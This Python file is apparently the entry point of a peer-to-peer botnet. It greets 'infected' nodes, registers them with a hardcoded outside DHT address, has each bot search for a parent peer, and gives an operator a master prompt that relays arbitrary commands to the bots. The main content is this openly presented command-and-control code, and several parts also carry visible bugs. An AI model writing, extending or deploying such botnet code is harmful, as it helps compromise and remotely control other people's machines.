import threading, dotenv, random, os, sys, time

from argparse import ArgumentParser, Namespace
from typing import List, Optional
from ipaddress import ip_address
from functools import partial
from pathlib import Path

from storage import BaseStorage, InMemoryStorage
from network import NetworkOptions, Address
from server import ThreadedTCPServer
from client import SocketClient

from bot import Bot
from dht import MockDHT
from logger import LOG


PARENT_NOT_FOUND = -1

MOCK_DHT_ADDRESS = Address(ip_address("51.250.96.145"), 3000)


def notify_port_changed(network_options: NetworkOptions, storage: BaseStorage) -> None:
    parent = storage.get_parent()
    client = SocketClient(network_options)
    client.change_destination(parent)
    # TODO: need separate command for this


def search_parent(self_network_options: NetworkOptions) -> Optional[Address]:
    LOG.info("Search parent for {}".format(self_network_options.address))
    dht = MockDHT(MOCK_DHT_ADDRESS)

    file_hash = os.environ.get("FILE_HASH", str())
    peers = dht.get_peers(file_hash)

    if not peers: 
        LOG.info("No peers. Parent cannot be assigned")
        return

    LOG.info("Trying choose parent")
    random.shuffle(peers)
    
    for i, peer_address in enumerate(peers):
        LOG.info("Processing {}/{} candidate".format(i, len(peers)))
        parent_options = NetworkOptions(
            address = peer_address,
            buffer_size = network_options.buffer_size,
            encoding = network_options.encoding
        )
        client = SocketClient(parent_options)

        try:
            LOG.info("Send request to {}".format(peer_address))
            received = client.send_message(
                f"0 INIT {self_network_options.address.host} {self_network_options.address.port}"
            )

        except TimeoutError as err:
            LOG.info("Request timeout on {}".format(peer_address))
            continue

        if received == "OK":
            LOG.info("Parent found {}".format(peer_address))
            return peer_address


def configure_server(network_options: NetworkOptions, bot_storage: BaseStorage) -> ThreadedTCPServer:
    LOG.info("Starting server configuration")
    bot = partial(Bot, bot_storage, network_options)
    server = ThreadedTCPServer((
        network_options.address.host, network_options.address.port), bot
    )

    if not network_options.address.port:
        ok = network_options.change_port(server.server_address[1])
        LOG.info("Setting auto generated port to {}".format(network_options.address.port))

    LOG.info("Server configuration completed")
    return server


def run_server(server: ThreadedTCPServer) -> None:
    with server:
        server_thread = threading.Thread(target = server.serve_forever)
        server_thread.start()
        LOG.info("Server startup on {}".format(network_options.address))
        server_thread.join()


def parse_args() -> Namespace:
    parser = ArgumentParser(add_help = False)
    parser.add_argument("-m", "--master", action = "store_true")
    parser.add_argument("-p", "--port", type = int, default = 0)
    parser.add_argument("-h", "--host", type = str)
    return parser.parse_args()


def load_environment(file: Path) -> None:
    dotenv.load_dotenv(file)


def start_master_mode(
    storage: BaseStorage, self_network_options: NetworkOptions, prompt: str = "master") -> None:

    client = SocketClient(self_network_options)
    LOG.info("Master mode started on {}".format(network_options.address))

    while True:
        command = input(f"[{prompt}]$ ")

        if command in ["childs", "CHILDS"]:
            childs = storage.get_childs()
            print("\n".join(childs))
            continue

        response = client.send_message(command)
        print(response)

# python3 main.py -m -p 12423 -h $(dig +short txt ch whoami.cloudflare @1.0.0.1)
if __name__ == "__main__":
    LOG.info("Welcome to botnet application. Thank you for being infected")

    environment_file = Path("../environment.env")
    LOG.info("Load environment from {}".format(environment_file))
    load_environment(environment_file)

    args = parse_args()
    if args.master:
        LOG.info("Master mode activated")

    network_options = NetworkOptions(
        address = Address(ip_address("0.0.0.0"), args.port),
        buffer_size = 1024,
        encoding = "utf-8"
    )
    network_options.try_load_from_file(Path("data/network_options.json"))

    storage = InMemoryStorage()
    LOG.info("Connected {} storage".format(storage))

    server = configure_server(network_options, bot_storage = storage)
    
    if not args.master:
        parent = search_parent(network_options)
        if not parent:
            LOG.info("Parent not found. Exit")
            sys.exit(PARENT_NOT_FOUND)
        else:
            LOG.info("Save parent in storage")
            storage.change_parent(parent)

    dht = MockDHT(MOCK_DHT_ADDRESS)
    LOG.info("Tryind add peer {} to network".format(network_options.address))
    file_hash = os.environ.get("FILE_HASH", str())

    # dig +short txt ch whoami.cloudflare @1.0.0.1
    host = args.host if args.host else "0.0.0.0"
    dht.add_peers([
        Address(ip_address(args.host[1:len(args.host)-1]), network_options.address.port), ], file_hash)
    
    try:
        LOG.info("Trying start server on {}".format(network_options.address))
        program = threading.Thread(target = partial(run_server, server))
        program.start(); time.sleep(0.5)
        
        if args.master:
            start_master_mode(storage, network_options)

    except OSError as err:
        LOG.info("Cannot start server. Error {}".format(err))
        network_options.change_port(new_port = 0)
        LOG.info("Setting port to zero for auto generation. Restarting")
        # notify_port_changed(network_options, storage)
        server = configure_server(network_options, bot_storage = storage)
        run_server(server)
